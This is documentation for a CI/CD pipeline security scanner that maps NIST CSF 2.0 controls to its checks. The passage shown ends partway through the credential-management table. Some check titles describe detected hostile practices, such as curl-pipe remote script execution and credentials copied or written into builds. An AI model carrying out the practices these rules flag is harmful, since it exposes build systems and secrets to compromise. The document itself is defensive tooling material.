# NIST Cybersecurity Framework 2.0

- **Version:** 2.0
- **URL:** <https://www.nist.gov/cyberframework>
- **Source of truth:** `pipeline_check/core/standards/data/nist_csf_2.py`

The NIST Cybersecurity Framework 2.0 organizes controls into six
functions (Govern, Identify, Protect, Detect, Respond, Recover).
This scanner evidences the Protect / Detect / Identify subset that
maps to CI/CD configuration; Govern, Respond, and Recover require
process telemetry the tool cannot witness.

## At a glance

- **Controls in this standard:** 23
- **Controls evidenced by at least one check:** 22 / 23
- **Distinct checks evidencing this standard:** 370
- **Of those, autofixable with `--fix`:** 97

_Severity levels (`CRITICAL` / `HIGH` / `MEDIUM` / `LOW` / `INFO`) follow the same scale across every provider and standard. See [How to read severity](README.md#how-to-read-severity) on the standards overview for the definitions._

## Coverage by control

Click a control ID to jump to the per-control section with the full check list. The severity mix column shows the spread of evidencing checks by severity (`C`ritical / `H`igh / `M`edium / `L`ow / `I`nfo).

| Control | Title | Checks | Severity mix |
|---------|-------|-------:|--------------|
| [`GV.SC-03`](#ctrl-gv-sc-03) | Cybersecurity supply chain risk management is integrated into CS and ERM programs | 6 | 6M |
| [`GV.SC-04`](#ctrl-gv-sc-04) | Suppliers are known and prioritized by criticality | 17 | 8H · 6M · 3L |
| [`GV.SC-05`](#ctrl-gv-sc-05) | Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts | 54 | 27H · 22M · 5L |
| [`GV.SC-07`](#ctrl-gv-sc-07) | Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored | 18 | 9H · 8M · 1L |
| [`GV.SC-08`](#ctrl-gv-sc-08) | Relevant suppliers and other third parties are included in incident planning, response, and recovery activities | 0 | — |
| [`PR.AA-01`](#ctrl-pr-aa-01) | Identities and credentials for authorized users, services, and hardware are managed | 44 | 17C · 18H · 9M |
| [`PR.AA-03`](#ctrl-pr-aa-03) | Users, services, and hardware are authenticated | 5 | 3H · 2M |
| [`PR.AA-05`](#ctrl-pr-aa-05) | Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed | 26 | 4C · 11H · 10M · 1L |
| [`PR.DS-01`](#ctrl-pr-ds-01) | The confidentiality, integrity, and availability of data-at-rest are protected | 16 | 4C · 6H · 6M |
| [`PR.DS-02`](#ctrl-pr-ds-02) | The confidentiality, integrity, and availability of data-in-transit are protected | 17 | 13H · 3M · 1L |
| [`PR.PS-01`](#ctrl-pr-ps-01) | Configuration management practices are established and applied | 59 | 10C · 20H · 22M · 7L |
| [`PR.PS-02`](#ctrl-pr-ps-02) | Software is maintained, replaced, and removed commensurate with risk | 16 | 3H · 11M · 2L |
| [`PR.PS-04`](#ctrl-pr-ps-04) | Log records are generated and made available for continuous monitoring | 9 | 1H · 4M · 4L |
| [`PR.PS-05`](#ctrl-pr-ps-05) | Installation and execution of unauthorized software are prevented | 34 | 9C · 22H · 2M · 1L |
| [`PR.PS-06`](#ctrl-pr-ps-06) | Secure software development practices are integrated, and their performance is monitored throughout the SDLC | 47 | 11H · 30M · 6L |
| [`PR.IR-01`](#ctrl-pr-ir-01) | Networks and environments are protected from unauthorized logical access and usage | 39 | 12C · 12H · 14M · 1L |
| [`PR.IR-03`](#ctrl-pr-ir-03) | Mechanisms are implemented to achieve resilience requirements in normal and adverse situations | 6 | 5M · 1L |
| [`DE.CM-01`](#ctrl-de-cm-01) | Networks and network services are monitored to find potentially adverse events | 1 | 1L |
| [`DE.CM-06`](#ctrl-de-cm-06) | External service provider activities and services are monitored | 2 | 1H · 1M |
| [`DE.CM-09`](#ctrl-de-cm-09) | Computing hardware and software, runtime environments, and their data are monitored | 15 | 3H · 8M · 4L |
| [`DE.AE-03`](#ctrl-de-ae-03) | Information is correlated from multiple sources | 2 | 1M · 1L |
| [`RS.MA-01`](#ctrl-rs-ma-01) | The incident response plan is executed once an incident is declared | 2 | 1M · 1L |
| [`RC.RP-01`](#ctrl-rc-rp-01) | The recovery portion of the incident response plan is executed once initiated | 2 | 2M |

## Filter at runtime

Restrict a scan to checks that evidence this standard with `--standard nist_csf_2`:

```bash
# All providers, only checks tied to this standard
pipeline_check --standard nist_csf_2

# Compose with --pipeline to scope by provider
pipeline_check --pipeline github --standard nist_csf_2

# Compose with another standard to widen the lens
pipeline_check --pipeline aws --standard nist_csf_2 --standard owasp_cicd_top_10
```

## Controls in scope

### GV.SC-03: Cybersecurity supply chain risk management is integrated into CS and ERM programs { #ctrl-gv-sc-03 }

**Evidenced by 6 checks** across 6 providers (Azure DevOps, Bitbucket, CircleCI, GitHub Actions, GitLab CI, Jenkins).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-007`](#detail-ado-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-007`](#detail-bb-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`CC-007`](#detail-cc-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`GHA-007`](#detail-gha-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-007`](#detail-gl-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-007`](#detail-jf-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |

### GV.SC-04: Suppliers are known and prioritized by criticality { #ctrl-gv-sc-04 }

**Evidenced by 17 checks** across 8 providers (AWS, Azure DevOps, Bitbucket, CircleCI, GitHub Actions, GitLab CI, Helm, Jenkins).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-007`](#detail-ado-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-018`](#detail-ado-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-007`](#detail-bb-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-014`](#detail-bb-014) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CA-002`](#detail-ca-002) | CodeArtifact repository has a public external connection | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CC-007`](#detail-cc-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-018`](#detail-cc-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ECR-006`](#detail-ecr-006) | ECR pull-through cache rule uses an untrusted upstream | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GHA-007`](#detail-gha-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-018`](#detail-gha-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-007`](#detail-gl-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-018`](#detail-gl-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-005`](#detail-helm-005) | Chart maintainers field empty or missing chain-of-custody info | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`HELM-007`](#detail-helm-007) | Chart.yaml description field is empty or missing | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`HELM-010`](#detail-helm-010) | Chart.yaml appVersion field is empty or missing | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`JF-007`](#detail-jf-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-018`](#detail-jf-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |

### GV.SC-05: Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts { #ctrl-gv-sc-05 }

**Evidenced by 54 checks** across 13 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Helm, Jenkins, Kubernetes, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-001`](#detail-ado-001) | Task reference not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-005`](#detail-ado-005) | Container image not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-009`](#detail-ado-009) | Container image pinned by tag rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-021`](#detail-ado-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-025`](#detail-ado-025) | Cross-repo template not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-028`](#detail-ado-028) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-001`](#detail-bb-001) | pipe: action not pinned to exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-009`](#detail-bb-009) | pipe: pinned by version rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-021`](#detail-bb-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-027`](#detail-bb-027) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-001`](#detail-bk-001) | Buildkite plugin not pinned to an exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-004`](#detail-bk-004) | Remote script piped into shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-009`](#detail-bk-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-010`](#detail-bk-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-011`](#detail-bk-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-009`](#detail-cb-009) | CodeBuild image not pinned by digest | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-001`](#detail-cc-001) | Orb not pinned to exact semver | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-003`](#detail-cc-003) | Docker image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-021`](#detail-cc-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-028`](#detail-cc-028) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-029`](#detail-cc-029) | Machine executor image not pinned | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-001`](#detail-df-001) | FROM image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-003`](#detail-df-003) | ADD pulls remote URL without integrity verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-004`](#detail-df-004) | RUN executes a remote script via curl-pipe / wget-pipe | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-016`](#detail-df-016) | Image lacks OCI provenance labels | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-021`](#detail-df-021) | RUN pip install bypasses TLS or uses an HTTP index | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-022`](#detail-df-022) | RUN uses npm install instead of npm ci | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`ECR-002`](#detail-ecr-002) | Image tags are mutable | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GCB-001`](#detail-gcb-001) | Cloud Build step image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-001`](#detail-gha-001) | Action not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-021`](#detail-gha-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-025`](#detail-gha-025) | Reusable workflow not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-029`](#detail-gha-029) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-001`](#detail-gl-001) | Image not pinned to specific version or digest | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-005`](#detail-gl-005) | include: pulls remote / project without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-009`](#detail-gl-009) | Image pinned to version tag rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-021`](#detail-gl-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-027`](#detail-gl-027) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-028`](#detail-gl-028) | services: image not pinned | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-030`](#detail-gl-030) | trigger: include: pulls child pipeline without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-001`](#detail-helm-001) | Chart.yaml declares legacy apiVersion: v1 | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-002`](#detail-helm-002) | Chart.lock missing per-dependency digests | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-003`](#detail-helm-003) | Chart dependency declared on a non-HTTPS repository | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-004`](#detail-helm-004) | Chart dependency version is a range, not an exact pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) |  |
| [`HELM-009`](#detail-helm-009) | Chart home / sources URL uses a non-HTTPS scheme | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`JF-001`](#detail-jf-001) | Shared library not pinned to a tag or commit | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-009`](#detail-jf-009) | Agent docker image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-021`](#detail-jf-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-031`](#detail-jf-031) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-035`](#detail-jf-035) | httpRequest step disables SSL verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-001`](#detail-k8s-001) | Container image not pinned by sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-036`](#detail-k8s-036) | ServiceAccount imagePullSecrets references missing Secret | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`SCM-005`](#detail-scm-005) | Dependabot security updates are not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-022`](#detail-scm-022) | Repo Actions permissions allow any source (no allow-list) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### GV.SC-07: Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored { #ctrl-gv-sc-07 }

**Evidenced by 18 checks** across 8 providers (AWS, Azure DevOps, Bitbucket, CircleCI, GitHub Actions, GitLab CI, Helm, Jenkins).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-001`](#detail-ado-001) | Task reference not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-022`](#detail-ado-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-001`](#detail-bb-001) | pipe: action not pinned to exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-022`](#detail-bb-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CA-002`](#detail-ca-002) | CodeArtifact repository has a public external connection | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CB-005`](#detail-cb-005) | Outdated managed build image | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-001`](#detail-cc-001) | Orb not pinned to exact semver | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-022`](#detail-cc-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ECR-006`](#detail-ecr-006) | ECR pull-through cache rule uses an untrusted upstream | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GHA-001`](#detail-gha-001) | Action not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-022`](#detail-gha-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-001`](#detail-gl-001) | Image not pinned to specific version or digest | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-022`](#detail-gl-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-002`](#detail-helm-002) | Chart.lock missing per-dependency digests | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-006`](#detail-helm-006) | Chart.yaml does not declare a kubeVersion compatibility range | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`HELM-008`](#detail-helm-008) | Chart.lock generated more than 90 days ago | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) |  |
| [`JF-001`](#detail-jf-001) | Shared library not pinned to a tag or commit | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-022`](#detail-jf-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |

### GV.SC-08: Relevant suppliers and other third parties are included in incident planning, response, and recovery activities { #ctrl-gv-sc-08 }

_No checks in this scanner currently evidence this control. Open an issue if your team would value coverage._

### PR.AA-01: Identities and credentials for authorized users, services, and hardware are managed { #ctrl-pr-aa-01 }

**Evidenced by 44 checks** across 12 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Jenkins, Kubernetes, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-003`](#detail-ado-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-008`](#detail-ado-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-014`](#detail-ado-014) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-003`](#detail-bb-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-008`](#detail-bb-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-011`](#detail-bb-011) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-017`](#detail-bb-017) | Repository token written to persistent storage | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-019`](#detail-bb-019) | after-script references secrets | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-002`](#detail-bk-002) | Literal secret value in pipeline env block | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CB-001`](#detail-cb-001) | Secrets in plaintext environment variables | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`CB-006`](#detail-cb-006) | CodeBuild source auth uses long-lived token | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CC-005`](#detail-cc-005) | AWS auth uses long-lived access keys in environment block | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-008`](#detail-cc-008) | Credential-shaped literal in config body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-019`](#detail-cc-019) | `add_ssh_keys` without fingerprint restriction | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CP-004`](#detail-cp-004) | Legacy ThirdParty/GitHub source action (OAuth token) | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`DF-006`](#detail-df-006) | ENV or ARG carries a credential-shaped literal value | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-019`](#detail-df-019) | COPY/ADD source path looks like a credential file | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-020`](#detail-df-020) | ARG declares a credential-named build argument | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-003`](#detail-gcb-003) | Secret Manager value referenced in step args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-007`](#detail-gcb-007) | availableSecrets references ``versions/latest`` | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-005`](#detail-gha-005) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-008`](#detail-gha-008) | Credential-shaped literal in workflow body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-019`](#detail-gha-019) | GITHUB_TOKEN written to persistent storage | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-003`](#detail-gl-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-008`](#detail-gl-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-013`](#detail-gl-013) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
